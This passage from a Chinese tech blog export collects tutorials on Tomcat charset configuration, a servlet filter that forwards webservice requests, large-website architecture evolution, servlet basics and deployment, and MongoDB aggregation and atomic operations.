<p>麻烦的是，URI和Body的charset还可以不一样，使用不同的方法进行设置和配置。</p>
<h2 id="Tomcat如何设置charset"><a href="#Tomcat如何设置charset" class="headerlink" title="Tomcat如何设置charset"></a>Tomcat如何设置charset</h2><p>Tomcat通过URI的charset来设置QueryString的charset。我们可以在Tomcat根目录下conf&#x2F;server.xml 中进行配置。</p>
<pre><code>&lt;Connector
URIEncoding=&quot;UTF-8&quot;
useBodyEncodingForURI=&quot;true&quot; 
acceptCount=&quot;100&quot;
connectionTimeout=&quot;20000&quot;
disableUploadTimeout=&quot;true&quot;
enableLookups=&quot;false&quot;
maxHttpHeaderSize=&quot;8192&quot;
maxSpareThreads=&quot;75&quot;
maxThreads=&quot;150&quot;
minSpareThreads=&quot;25&quot;
port=&quot;8080&quot;
redirectPort=&quot;8443&quot;/&gt;
</code></pre>
<p>URIEncoding属性就是URI的charset，上述配置表示 Tomcat认为URI的charset就是UTF-8。如果HttpClient也使用UTF-8作为QueryString的charset，那么Tomcat就可以正确decoding。详情可以参考org.apache.tomcat.util.http.Parameters类的handleQueryParameters的方法。</p>
<p>Tomcat在启动的过程中，如果从conf&#x2F;server.xml中读取到URIEncoding属性，就会设置queryStringEncoding的值。当Tomcat处理HTTP请求时，上述方法就会被调用。</p>
<p>默认的server.xml是没有配置URIEncoding属性的，需要我们手动设置 。如果没有设置，Tomcat就会采用一种称为“fast conversion”的方式解析QueryString。详情可以参考org.apache.tomcat.util.http.Parameter类的urlDecode方法。</p>
<p>useBodyEncodingForURI是与URI charset相关的另一个属性。如果该属性的值为true，则Tomcat将使用Body的charset作为URI的charset。如果Tomcat没有设置Body的charset，那么将使用HTTP请求Content-Type Header中的charset。如果HTTP请求中没有设置Content-Type Header，则使用ISO-8859-1作为默认charset。详情参见org.apache.catalina.connector.Request的parseParmeters方法</p>
<p>默认的server.xml是没有配置useBodyEncodingForURI属性的，需要我们手动设置 。如果没有设置，Tomcat则认为其值为false。需要注意的是，如果URIEncoding和useBodyEncodingForURI同时设置，而且Body的charset已经设置，那么将以Body的charset为准 。</p>
<p>设置POST请求Body的charset：</p>
<p>设置Body charset的方法很简单，只要调用javax.servlet.ServletRequest接口的setCharacterEncoding方法即可，比如request.setCharacterEncoding(“UTF-8”)。需要注意的是，该方法必须在读取任何请求参数之前调用，才有效果。</p>
<p>也就是说，我们只有在调用getParameter或getReader方法之前，调用setsetCharacterEncoding方法，设置的charset才能奏效。</p>
<p>响应数据的charset：</p>
<p>设置响应数据charset的方法很简单，只要调用javax.servlet.ServletResponse接口的setContentType或setCharacterEncoding方法即可，比如response.setContentType(“text&#x2F;html;charset&#x3D;UTF-8”)或response.setCharacterEncoding(“UTF-8”)。</p>
<p>如果Servlet正确设置了响应数据的charset，那么HTTP响应数据中就会包含Content-Type Header。HttpClient的getResponseBodyAsString方法就可以正确decoding响应数据。</p>
]]></content>
      <categories>
        <category>架构</category>
        <category>反向代理</category>
      </categories>
      <tags>
        <tag>HttpClient</tag>
      </tags>
  </entry>
  <entry>
    <title>反向代理之如何转发webservice请求</title>
    <url>/blog/arch/rproxy/transws/</url>
    <content><![CDATA[<p>添加拦截器拦截所有webservice请求：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;filter&gt;</span><br><span class="line">  &lt;filter-name&gt;WsTransFilter&lt;/filter-name&gt;</span><br><span class="line">  &lt;filter-class&gt;com.nfbank.rproxy.filter.WsTransFilter&lt;/filter-class&gt;</span><br><span class="line">&lt;/filter&gt;</span><br><span class="line">&lt;filter-mapping&gt;</span><br><span class="line">  &lt;filter-name&gt;WsTransFilter&lt;/filter-name&gt;</span><br><span class="line">  &lt;url-pattern&gt;/webservice/*&lt;/url-pattern&gt;</span><br><span class="line">&lt;/filter-mapping&gt;</span><br></pre></td></tr></table></figure>

<p>转发请求到对应地址：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import java.io.IOException;</span><br><span class="line">import java.util.Enumeration;</span><br><span class="line"></span><br><span class="line">import javax.servlet.Filter;</span><br><span class="line">import javax.servlet.FilterChain;</span><br><span class="line">import javax.servlet.FilterConfig;</span><br><span class="line">import javax.servlet.ServletException;</span><br><span class="line">import javax.servlet.ServletRequest;</span><br><span class="line">import javax.servlet.ServletResponse;</span><br><span class="line">import javax.servlet.http.HttpServletRequest;</span><br><span class="line">import javax.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line">import org.apache.cxf.helpers.IOUtils;</span><br><span class="line">import org.apache.http.Header;</span><br><span class="line">import org.apache.http.client.methods.CloseableHttpResponse;</span><br><span class="line">import org.apache.http.client.methods.HttpPost;</span><br><span class="line">import org.apache.http.entity.InputStreamEntity;</span><br><span class="line">import org.apache.http.impl.client.CloseableHttpClient;</span><br><span class="line">import org.apache.http.impl.client.HttpClients;</span><br><span class="line"></span><br><span class="line">public class WsTransFilter implements Filter &#123;</span><br><span class="line"></span><br><span class="line">	@Override</span><br><span class="line">	public void doFilter(ServletRequest req, ServletResponse resp,</span><br><span class="line">			FilterChain chain) throws IOException, ServletException &#123;</span><br><span class="line">		HttpServletRequest request = (HttpServletRequest) req;</span><br><span class="line">		HttpServletResponse response = (HttpServletResponse) resp;</span><br><span class="line"></span><br><span class="line">		try &#123;</span><br><span class="line">			CloseableHttpClient httpClient = HttpClients.createDefault();</span><br><span class="line">			HttpPost httpPost = new HttpPost(&quot;这里是服务的地址&quot;);</span><br><span class="line">			InputStreamEntity entity = new InputStreamEntity(</span><br><span class="line">					request.getInputStream());</span><br><span class="line">			httpPost.setEntity(entity);</span><br><span class="line">			for (Enumeration&lt;String&gt; e = request.getHeaderNames(); e</span><br><span class="line">					.hasMoreElements();) &#123;</span><br><span class="line">				String name = e.nextElement().toString();</span><br><span class="line">				if (&quot;Content-Length&quot;.equals(name)) &#123;</span><br><span class="line">					continue;</span><br><span class="line">				&#125;</span><br><span class="line">				httpPost.setHeader(name, request.getHeader(name));</span><br><span class="line">			&#125;</span><br><span class="line">			CloseableHttpResponse httpResponse = httpClient.execute(httpPost);</span><br><span class="line">			for (Header h : httpResponse.getAllHeaders()) &#123;</span><br><span class="line">				response.setHeader(h.getName(), h.getValue());</span><br><span class="line">			&#125;</span><br><span class="line">			IOUtils.copyAndCloseInput(httpResponse.getEntity().getContent(),</span><br><span class="line">					response.getOutputStream());</span><br><span class="line">		&#125; catch (Exception e) &#123;</span><br><span class="line">			response.setContentType(&quot;text/xml;charset=UTF-8&quot;);</span><br><span class="line">			String result = &quot;&lt;soap:Envelope xmlns:soap=\&quot;http://schemas.xmlsoap.org/soap/envelope/\&quot;&gt;&quot;</span><br><span class="line">					+ &quot;&lt;soap:Body&gt;&lt;soap:Fault&gt;&lt;faultcode&gt;&quot;</span><br><span class="line">					+ &quot;9999&quot;</span><br><span class="line">					+ &quot;&lt;/faultcode&gt;&quot;</span><br><span class="line">					+ &quot;&lt;faultstring&gt;&quot;</span><br><span class="line">					+ &quot;失败:&quot;</span><br><span class="line">					+ e.getMessage()</span><br><span class="line">					+ &quot;&lt;/faultstring&gt;&lt;/soap:Fault&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;&quot;;</span><br><span class="line">			response.getWriter().print(result);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	@Override</span><br><span class="line">	public void init(FilterConfig filterConfig) throws ServletException &#123;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	@Override</span><br><span class="line">	public void destroy() &#123;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>架构</category>
        <category>反向代理</category>
      </categories>
      <tags>
        <tag>HttpClient</tag>
      </tags>
  </entry>
  <entry>
    <title>大型网站系统架构的演化</title>
    <url>/blog/arch/web/webjgyh/</url>
    <content><![CDATA[<p>转自：<a href="http://www.cnblogs.com/leefreeman/p/3993449.html">http://www.cnblogs.com/leefreeman/p/3993449.html</a></p>
<p>前言</p>
<p>一个成熟的大型网站（如淘宝、京东等）的系统架构并不是开始设计就具备完整的高性能、高可用、安全等特性，它总是随着用户量的增加，业务功能的扩展逐渐演变完善的，在这个过程中，开发模式、技术架构、设计思想也发生了很大的变化，就连技术人员也从几个人发展到一个部门甚至一条产品线。所以成熟的系统架构是随业务扩展而完善出来的，并不是一蹴而就；不同业务特征的系统，会有各自的侧重点，例如淘宝，要解决海量的商品信息的搜索、下单、支付，例如腾讯，要解决数亿的用户实时消息传输，百度它要处理海量的搜索请求，他们都有各自的业务特性，系统架构也有所不同。尽管如此我们也可以从这些不同的网站背景下，找出其中共用的技术，这些技术和手段可以广泛运行在大型网站系统的架构中，下面就通过介绍大型网站系统的演化过程，来认识这些技术和手段。</p>
<p>一、最开始的网站架构</p>
<p>最初的架构，应用程序、数据库、文件都部署在一台服务器上，如图：</p>
<p><img src="/images/arch/251844423268454.png">{width&#x3D;”453” height&#x3D;”347”}</p>
<p>二、应用、数据、文件分离</p>
<p>随着业务的扩展，一台服务器已经不能满足性能需求，故将应用程序、数据库、文件各自部署在独立的服务器上，并且根据服务器的用途配置不同的硬件，达到最佳的性能效果。</p>
<p><img src="/images/arch/251844436545725.png">{width&#x3D;”603” height&#x3D;”375”}</p>
<p>三、利用缓存改善网站性能</p>
<p>在硬件优化性能的同时，同时也通过软件进行性能优化，在大部分的网站系统中，都会利用缓存技术改善系统的性能，使用缓存主要源于热点数据的存在，大部分网站访问都遵循28原则（即80%的访问请求，最终落在20%的数据上），所以我们可以对热点数据进行缓存，减少这些数据的访问路径，提高用户体验。</p>
<p><img src="/images/arch/302146030501236.png">{width&#x3D;”548” height&#x3D;”558”}</p>
<p>缓存实现常见的方式是本地缓存、分布式缓存。当然还有CDN、反向代理等，这个后面再讲。本地缓存，顾名思义是将数据缓存在应用服务器本地，可以存在内存中，也可以存在文件，OSCache就是常用的本地缓存组件。本地缓存的特点是速度快，但因为本地空间有限所以缓存数据量也有限。分布式缓存的特点是，可以缓存海量的数据，并且扩展非常容易，在门户类网站中常常被使用，速度按理没有本地缓存快，常用的分布式缓存是Memcached、Redis。</p>
<p>四、使用集群改善应用服务器性能</p>
<p>应用服务器作为网站的入口，会承担大量的请求，我们往往通过应用服务器集群来分担请求数。应用服务器前面部署负载均衡服务器调度用户请求，根据分发策略将请求分发到多个应用服务器节点。</p>
<p><img src="/images/arch/302146060811294.png">{width&#x3D;”721” height&#x3D;”469”}</p>
<p>常用的负载均衡技术硬件的有F5，价格比较贵，软件的有LVS、Nginx、HAProxy。LVS是四层负载均衡，根据目标地址和端口选择内部服务器，Nginx是七层负载均衡和HAProxy支持四层、七层负载均衡，可以根据报文内容选择内部服务器，因此LVS分发路径优于Nginx和HAProxy，性能要高些，而Nginx和HAProxy则更具配置性，如可以用来做动静分离（根据请求报文特征，选择静态资源服务器还是应用服务器）。</p>
<p>五、数据库读写分离和分库分表</p>
<p>随着用户量的增加，数据库成为最大的瓶颈，改善数据库性能常用的手段是进行读写分离以及分表，读写分离顾名思义就是将数据库分为读库和写库，通过主备功能实现数据同步。分库分表则分为水平切分和垂直切分，水平切换则是对一个数据库特大的表进行拆分，例如用户表。垂直切分则是根据业务不同来切换，如用户业务、商品业务相关的表放在不同的数据库中。</p>
<p><img src="/images/arch/302146095341882.png">{width&#x3D;”706” height&#x3D;”439”}</p>
<p>六、使用CDN和反向代理提高网站性能</p>
<p>假如我们的服务器都部署在成都的机房，对于四川的用户来说访问是较快的，而对于北京的用户访问是较慢的，这是由于四川和北京分别属于电信和联通的不同发达地区，北京用户访问需要通过互联路由器经过较长的路径才能访问到成都的服务器，返回路径也一样，所以数据传输时间比较长。对于这种情况，常常使用CDN解决，CDN将数据内容缓存到运营商的机房，用户访问时先从最近的运营商获取数据，这样大大减少了网络访问的路径。比较专业的CDN运营商有蓝汛、网宿。</p>
<p>而反向代理，则是部署在网站的机房，当用户请求达到时首先访问反向代理服务器，反向代理服务器将缓存的数据返回给用户，如果没有没有缓存数据才会继续走应用服务器获取，也减少了获取数据的成本。反向代理有Squid，Nginx。</p>
<p><img src="/images/arch/302146127222157.png">{width&#x3D;”656” height&#x3D;”547”}</p>
<p>七、使用分布式文件系统</p>
<p>用户一天天增加，业务量越来越大，产生的文件越来越多，单台的文件服务器已经不能满足需求。需要分布式的文件系统支撑。常用的分布式文件系统有NFS。</p>
<p><img src="/images/arch/302146163629801.png">{width&#x3D;”686” height&#x3D;”479”}</p>
<p>八、使用NoSql和搜索引擎</p>
<p>对于海量数据的查询，我们使用nosql数据库加上搜索引擎可以达到更好的性能。并不是所有的数据都要放在关系型数据中。常用的NOSQL有mongodb和redis，搜索引擎有lucene。</p>
<p><img src="/images/arch/302146204097504.png">{width&#x3D;”692” height&#x3D;”513”}</p>
<p>九、将应用服务器进行业务拆分</p>
<p>随着业务进一步扩展，应用程序变得非常臃肿，这时我们需要将应用程序进行业务拆分，如百度分为新闻、网页、图片等业务。每个业务应用负责相对独立的业务运作。业务之间通过消息进行通信或者同享数据库来实现。</p>
<p><img src="/images/arch/302146241449879.png">{width&#x3D;”693” height&#x3D;”513”}</p>
<p>十、搭建分布式服务</p>
<p>这时我们发现各个业务应用都会使用到一些基本的业务服务，例如用户服务、订单服务、支付服务、安全服务，这些服务是支撑各业务应用的基本要素。我们将这些服务抽取出来利用分部式服务框架搭建分布式服务。淘宝的Dubbo是一个不错的选择。</p>
<p><img src="/images/arch/302146285194383.png">{width&#x3D;”786” height&#x3D;”622”}</p>
<p>小结</p>
<p>大型网站的架构是根据业务需求不断完善的，根据不同的业务特征会做特定的设计和考虑，本文只是讲述一个常规大型网站会涉及的一些技术和手段。</p>
<p>参考资料：</p>
<p>《大型网站技术架构》 ——李智慧</p>
<p>《海量运维运营规划》 ——唐文</p>
]]></content>
      <categories>
        <category>架构</category>
      </categories>
      <tags>
        <tag>架构</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA WEB之ServletConfig</title>
    <url>/blog/javaweb/servlet/servletconfig/</url>
    <content><![CDATA[<p>在Servlet的配置文件web.xml中，可以使用一个或多个&lt;init-param&gt;标签为servlet配置一些初始化参数。</p>
<pre><code>&lt;servlet&gt;
    &lt;servlet-name&gt;ServletConfigDemo1&lt;/servlet-name&gt;
    &lt;servlet-class&gt;com.iteedu.javaweb.ServletConfigDemo1&lt;/servlet-class&gt;
    &lt;!--配置ServletConfigDemo1的初始化参数 --&gt;
    &lt;init-param&gt;
        &lt;param-name&gt;name&lt;/param-name&gt;
        &lt;param-value&gt;gacl&lt;/param-value&gt;
    &lt;/init-param&gt;
     &lt;init-param&gt;
        &lt;param-name&gt;password&lt;/param-name&gt;
        &lt;param-value&gt;123&lt;/param-value&gt;
    &lt;/init-param&gt;
    &lt;init-param&gt;
        &lt;param-name&gt;charset&lt;/param-name&gt;
        &lt;param-value&gt;UTF-8&lt;/param-value&gt;
    &lt;/init-param&gt;
&lt;/servlet&gt;
</code></pre>
<p>当servlet配置了初始化参数后，web容器在创建servlet实例对象时，会自动将这些初始化参数封装到ServletConfig对象中，并在调用servlet的init方法时，将ServletConfig对象传递给servlet。进而，我们通过ServletConfig对象就可以得到当前servlet的初始化参数信息。</p>
<pre><code>com.iteedu.javaweb;

import java.io.IOException;
import java.util.Enumeration;
import javax.servlet.ServletConfig;
import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

public class ServletConfigDemo1 extends HttpServlet &#123;

    /**
     * 定义ServletConfig对象来接收配置的初始化参数
     */
    private ServletConfig config;
    
    /**
     * 当servlet配置了初始化参数后，web容器在创建servlet实例对象时，
     * 会自动将这些初始化参数封装到ServletConfig对象中，并在调用servlet的init方法时，
     * 将ServletConfig对象传递给servlet。进而，程序员通过ServletConfig对象就可以
     * 得到当前servlet的初始化参数信息。
     */
    @Override
    public void init(ServletConfig config) throws ServletException &#123;
        this.config = config;
    &#125;

    public void doGet(HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException &#123;
        //获取在web.xml中配置的初始化参数
        String paramVal = this.config.getInitParameter(&quot;name&quot;);//获取指定的初始化参数
        response.getWriter().print(paramVal);
        
        response.getWriter().print(&quot;&quot;);
        //获取所有的初始化参数
        Enumeration e = config.getInitParameterNames();
        while(e.hasMoreElements())&#123;
            String name = e.nextElement();
            String value = config.getInitParameter(name);
            response.getWriter().print(name + &quot;=&quot; + value + &quot;&quot;);
        &#125;
    &#125;

    public void doPost(HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException &#123;
        this.doGet(request, response);
    &#125;

&#125;
</code></pre>
]]></content>
      <categories>
        <category>JAVA WEB</category>
      </categories>
      <tags>
        <tag>servlet</tag>
      </tags>
  </entry>
  <entry>
    <title>手工创建布署一个servlet</title>
    <url>/blog/javaweb/servlet/firstservlet/</url>
    <content><![CDATA[<p>本文主要讲如何纯手工布置一个servlet。由于要在tomcat中部署，所以在这前先要对tomcat有简单了解。</p>
<h4 id="java-web项目结构"><a href="#java-web项目结构" class="headerlink" title="java web项目结构"></a>java web项目结构</h4><p>先介绍一下java web的项目结构：</p>
<p>在web应用部署目录每一个目录或war包都可以是一个应用。</p>
<p>web应用必须要有以下文件和目录结构：</p>
<p>[应用名]\WEB-INF\</p>
<p>[应用名]\WEB-INF\web.xml ：配制JAVA WEB的servlet、filter、listener等</p>
<p>[应用名]\WEB-INF\classes\ :存放编译后的class文件</p>
<p>[应用名]\WEB-INF\lib\ ：存放依赖的jar包</p>
<p>只要目录存在”[应用名]\WEB-INF\classes\web.xml”servlet窗口如tomcat就会认为目录是一个web应用。</p>
<p>“[应用名]\“下可以放置正常的web内容如html文件，图片文件等。</p>
<h4 id="制作servlet"><a href="#制作servlet" class="headerlink" title="制作servlet"></a>制作servlet</h4><p>第一步：在C:\Tomcat xx\webapps目录下添加你要布署的站点。</p>
<p>如myservlet。新建myservlet目录。然后在myservlet目录下新建WEB-INF目录，大小写必须保持一致。</p>
<p>接着请在WEB-INF目录下建立classes与lib两个目录。其中classes目录是用来放置servlet文件，而lib目录则用来存放你在这个站点中所需要用到的jar包(下例不用)。通常的如：数据库驱动程序等。</p>
<p>在WEB-INF目录再建立一个以web.xml为命名的文件。</p>
<p>第二步：写servlet文件。这里以Hello.java命名。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import java.io.*; </span><br><span class="line">import javax.servlet.*; </span><br><span class="line">import javax.servlet.http.*; </span><br><span class="line"></span><br><span class="line">public class Hello extends HttpServlet&#123; </span><br><span class="line">    public void doGet(HttpServletRequest req,</span><br><span class="line">                                HttpServletResponse resp) </span><br><span class="line">                                throws ServletException,IOException&#123; </span><br><span class="line">       resp.setContentType(&quot;text/html&quot;); </span><br><span class="line">       PrintWriter out=resp.getWriter(); </span><br><span class="line">       out.println(&quot;&lt;HTML&gt;&quot;); </span><br><span class="line">       out.println(&quot;&lt;BODY&gt;&quot;); </span><br><span class="line">       out.println(&quot;&lt;h1&gt;Hello&lt;h1/&gt;&quot;); </span><br><span class="line">       out.println(&quot;&lt;/BODY&gt;&quot;); </span><br><span class="line">       out.println(&quot;&lt;/HTML&gt;&quot;); </span><br><span class="line">       out.close(); </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p> </p>
<p>第三步：编译这个Hello.java文件。在这之前要在classpath中添加好所要的类库,装了j2ee的在其下的lib目录中找(javaee.jar是必要的),用tomcat的其下server\lib目录中有可用jar文件。若不知加的对不对，可将jar文件解压，看里面有要的类不。</p>
<p>用javac编译，同一般java类。若目录中生成一个Hello.class的文件。说明编译成功。</p>
<p>第四步，让服务器找到这个servlet文件。就必须在web.xml中进行设置。</p>
<p>在web.xml写入代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt; </span><br><span class="line">&lt;web-app http://java.sun.com/xml/ns/javaee&quot;;&gt;http://java.sun.com/xml/ns/javaee&quot; </span><br><span class="line">   xmlns:http://www.w3.org/2001/XMLSchema-instance&quot;;&gt;http://www.w3.org/2001/XMLSchema-instance&quot; </span><br><span class="line">   xsi:schemaLhttp://java.sun.com/xml/ns/javaee&quot;;&gt;http://java.sun.com/xml/ns/javaeehttp://java.sun.com/xml/ns/javaee/web-app_2_5.xsd&quot; </span><br><span class="line">   version=&quot;2.5&quot;&gt; </span><br><span class="line">  &lt;!--下面的代码是布置servlet!--&gt; </span><br><span class="line">  &lt;servlet&gt; </span><br><span class="line">   &lt;!--给你现在布置的servlet取个名字--&gt; </span><br><span class="line">   &lt;servlet-name&gt;hello&lt;/servlet-name&gt; </span><br><span class="line">   &lt;!--告诉服务器servlet所在的路径:包名+类名.--&gt; </span><br><span class="line">   &lt;servlet-class&gt;Hello&lt;/servlet-class&gt; </span><br><span class="line">  &lt;/servlet&gt; </span><br><span class="line">  &lt;servlet-mapping&gt; </span><br><span class="line">   &lt;!--用servlet名定位--&gt; </span><br><span class="line">   &lt;servlet-name&gt;hello&lt;/servlet-name&gt; </span><br><span class="line">   &lt;!--在浏览器中访问该servlet所用的链接后缀!--&gt; </span><br><span class="line">   &lt;url-pattern&gt;/hi&lt;/url-pattern&gt; </span><br><span class="line">  &lt;/servlet-mapping&gt; </span><br><span class="line">  &lt;!---以上代码为布置servlet!--&gt; </span><br><span class="line">&lt;/web-app&gt;</span><br></pre></td></tr></table></figure>

<p>第五步：重启tomcat。在浏览器中输入：<a href="http://localhost:8080/myservlet/hi%E8%BF%99%E6%A0%B7%E5%B0%B1%E5%8F%AF%E4%BB%A5%E8%AE%BF%E9%97%AE%E5%8F%91%E5%B8%83%E7%9A%84servlet%E6%9C%8D%E5%8A%A1%E4%BA%86%E3%80%82">http://localhost:8080/myservlet/hi这样就可以访问发布的servlet服务了。</a></p>
]]></content>
      <categories>
        <category>JAVA WEB</category>
      </categories>
      <tags>
        <tag>servlet</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA WEB基础servlet简介</title>
    <url>/blog/javaweb/servlet/servletjj/</url>
    <content><![CDATA[<h4 id="Servlet简介"><a href="#Servlet简介" class="headerlink" title="Servlet简介"></a>Servlet简介</h4><p>Servlet是一门用于开发动态web资源的技术。</p>
<p>用户若想用发一个动态web资源(即开发一个Java程序向浏览器输出数据)，需要完成以下2个步骤：</p>
<p>1、编写一个Java类，实现servlet接口。</p>
<p>2、把开发好的Java类部署到web服务器中。</p>
<p>按照一种约定俗成的称呼习惯，通常我们也把实现了servlet接口的java程序，称之为Servlet</p>
<h4 id="Servlet的运行过程"><a href="#Servlet的运行过程" class="headerlink" title="Servlet的运行过程"></a>Servlet的运行过程</h4><p>1.Servlet程序是由WEB服务器调用，web服务器收到客户端的Servlet访问请求后：</p>
<p>2.Web服务器首先检查是否已经装载并创建了该Servlet的实例对象。如果是，则直接执行第4步，否则，执行第2步。</p>
<p>3.装载并创建该Servlet的一个实例对象。</p>
<p>4.调用Servlet实例对象的init()方法。</p>
<p>5.创建一个用于封装HTTP请求消息的HttpServletRequest对象和一个代表HTTP响应消息的HttpServletResponse对象，然后调用Servlet的service()方法并将请求和响应对象作为参数传递进去。</p>
<p>6.WEB应用程序被停止或重新启动之前，Servlet引擎将卸载Servlet，并在卸载之前调用Servlet的destroy()方法。</p>
<h4 id="Servlet调用时序图"><a href="#Servlet调用时序图" class="headerlink" title="Servlet调用时序图"></a>Servlet调用时序图</h4><p><img src="/images/javaweb/servletcall.png"></p>
]]></content>
      <categories>
        <category>JAVA WEB</category>
      </categories>
      <tags>
        <tag>servlet</tag>
      </tags>
  </entry>
  <entry>
    <title>MongoDB 聚合方法aggregate()</title>
    <url>/blog/nosql/mongodb/aggregate/</url>
    <content><![CDATA[<p>MongoDB中聚合(aggregate)主要用于处理数据(诸如统计平均值,求和等)，并返回计算后的数据结果。有点类似sql语句中的<br>count(*)。</p>
<p>MongoDB中聚合的方法使用aggregate()。</p>
<p>aggregate() 方法的基本语法格式如下所示：</p>
<pre><code>&gt;db.COLLECTION_NAME.aggregate(AGGREGATE_OPERATION)
</code></pre>
<p>一些聚合的表达式:</p>
<table>
<thead>
<tr>
<th>表达式</th>
<th>描述</th>
<th>实例</th>
</tr>
</thead>
<tbody><tr>
<td>$sum</td>
<td>计算总和。</td>
<td>db.mycol.aggregate([{$group : {_id : “$by_user”, num_tutorial : {$sum : “$likes”}}}])</td>
</tr>
<tr>
<td>$avg</td>
<td>计算平均值</td>
<td>db.mycol.aggregate([{$group : {_id : “$by_user”, num_tutorial : {$avg : “$likes”}}}])</td>
</tr>
<tr>
<td>min</td>
<td>获取集合中所有文档对应值得最小值。</td>
<td>db.mycol.aggregate([{$group : {_id : “$by_user”, num_tutorial : {$min : “$likes”}}}])</td>
</tr>
<tr>
<td>$max</td>
<td>获取集合中所有文档对应值得最大值。</td>
<td>db.mycol.aggregate([{$group : {_id : “$by_user”, num_tutorial : {$max : “$likes”}}}])</td>
</tr>
<tr>
<td>$push</td>
<td>在结果文档中插入值到一个数组中。</td>
<td>db.mycol.aggregate([{$group : {_id : “$by_user”, url : {$push: “$url”}}}])</td>
</tr>
<tr>
<td>$addToSet</td>
<td>在结果文档中插入值到一个数组中，但不创建副本。</td>
<td>db.mycol.aggregate([{$group : {_id : “$by_user”, url : {$addToSet : “$url”}}}])</td>
</tr>
<tr>
<td>$first</td>
<td>根据资源文档的排序获取第一个文档数据。</td>
<td>db.mycol.aggregate([{$group : {_id : “$by_user”, first_url : {$first : “$url”}}}])</td>
</tr>
<tr>
<td>$last</td>
<td>根据资源文档的排序获取最后一个文档数据</td>
<td>db.mycol.aggregate([{$group : {_id : “$by_user”, last_url : {$last : “$url”}}}])</td>
</tr>
</tbody></table>
<p>示例：</p>
<pre><code>&gt; db.mycol.aggregate([&#123;$group : &#123;_id : &quot;$by_user&quot;, num_tutorial : &#123;$sum : 1&#125;&#125;&#125;])
&#123;
   &quot;result&quot; : [
      &#123;
         &quot;_id&quot; : &quot;w3cschool.cc&quot;,
         &quot;num_tutorial&quot; : 2
      &#125;,
      &#123;
         &quot;_id&quot; : &quot;Neo4j&quot;,
         &quot;num_tutorial&quot; : 1
      &#125;
   ],
   &quot;ok&quot; : 1
&#125;
&gt;
</code></pre>
<p>以上实例类似sql语句： select by_user, count(*) from mycol group by<br>by_user</p>
<p>在上面的例子中，我们通过字段by_user字段对数据进行分组，并计算by_user字段相同值的总和。</p>
<h2 id="管道的概念"><a href="#管道的概念" class="headerlink" title="管道的概念"></a>管道的概念</h2><p>管道在Unix和Linux中一般用于将当前命令的输出结果作为下一个命令的参数。</p>
<p>MongoDB的聚合管道将MongoDB文档在一个管道处理完毕后将结果传递给下一个管道处理。管道操作是可以重复的。</p>
<p>表达式：处理输入文档并输出。表达式是无状态的，只能用于计算当前聚合管道的文档，不能处理其它的文档。</p>
<p>这里我们介绍一下聚合框架中常用的几个操作：</p>
<ul>
<li>$project：修改输入文档的结构。可以用来重命名、增加或删除域，也可以用于创建计算结果以及嵌套文档。</li>
<li>$match：用于过滤数据，只输出符合条件的文档。$match使用MongoDB的标准查询操作。</li>
<li>$limit：用来限制MongoDB聚合管道返回的文档数。</li>
<li>$skip：在聚合管道中跳过指定数量的文档，并返回余下的文档。</li>
<li>$unwind：将文档中的某一个数组类型字段拆分成多条，每条包含数组中的一个值。</li>
<li>$group：将集合中的文档分组，可用于统计结果。</li>
<li>$sort：将输入文档排序后输出。</li>
<li>$geoNear：输出接近某一地理位置的有序文档。</li>
</ul>
<p>示例：</p>
<p>1、$project实例</p>
<pre><code>db.article.aggregate(
    &#123; $project : &#123;
        title : 1 ,
        author : 1 ,
    &#125;&#125;
 );
</code></pre>
<p>这样的话结果中就只还有_id,tilte和author三个字段了，默认情况下_id字段是被包含的，如果要想不包含_id话可以这样:</p>
<pre><code>db.article.aggregate(
    &#123; $project : &#123;
        _id : 0 ,
        title : 1 ,
        author : 1
    &#125;&#125;);
</code></pre>
<p>2.$match实例</p>
<pre><code>db.articles.aggregate( [
                        &#123; $match : &#123; score : &#123; $gt : 70, $lte : 90 &#125; &#125; &#125;,
                        &#123; $group: &#123; _id: null, count: &#123; $sum: 1 &#125; &#125; &#125;
                       ] );
</code></pre>
<p>$match用于获取分数大于70小于或等于90记录，然后将符合条件的记录送到下一阶段$group管道操作符进行处理。</p>
<p>3.$skip实例</p>
<pre><code>db.article.aggregate(
    &#123; $skip : 5 &#125;);
</code></pre>
<p>经过$skip管道操作符处理后，前五个文档被”过滤”掉。</p>
]]></content>
      <categories>
        <category>nosql</category>
        <category>MongoDB</category>
      </categories>
      <tags>
        <tag>nosql</tag>
        <tag>MongoDB</tag>
      </tags>
  </entry>
  <entry>
    <title>MongoDB 原子操作</title>
    <url>/blog/nosql/mongodb/atomic/</url>
    <content><![CDATA[<p>mongodb不支持事务，所以，在你的项目中应用时，要注意这点。无论什么设计，都不要要求mongodb保证数据的完整性。</p>
<p>但是mongodb提供了许多原子操作，比如文档的保存，修改，删除等，都是原子操作。</p>
<p>所谓原子操作就是要么这个文档保存到Mongodb，要么没有保存到Mongodb，不会出现查询到的文档没有保存完整的情况。</p>
<h2 id="原子操作数据模型"><a href="#原子操作数据模型" class="headerlink" title="原子操作数据模型"></a>原子操作数据模型</h2><p>考虑下面的例子，图书馆的书籍及结账信息。</p>
<p>实例说明了在一个相同的文档中如何确保嵌入字段关联原子操作（update：更新）的字段是同步的。</p>
<pre><code>book = &#123;
          _id: 123456789,
          title: &quot;MongoDB: The Definitive Guide&quot;,
          author: [ &quot;Kristina Chodorow&quot;, &quot;Mike Dirolf&quot; ],
          published_date: ISODate(&quot;2010-09-24&quot;),
          pages: 216,
